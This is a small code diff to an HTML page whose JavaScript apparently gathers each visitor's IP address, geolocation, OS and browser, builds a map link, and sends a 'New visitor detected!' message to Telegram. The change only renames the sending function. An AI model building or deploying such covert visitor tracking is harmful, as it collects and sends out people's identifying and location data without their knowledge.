@@ -253,7 +253,7 @@ htmlCopy<!DOCTYPE html>
             return browser;
         }
 
-        async function sendIPToTelegram(ip, location, os, browser) {
+        async function sendToTelegram(ip, location, os, browser) {
             const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
             const message = `
 New visitor detected!
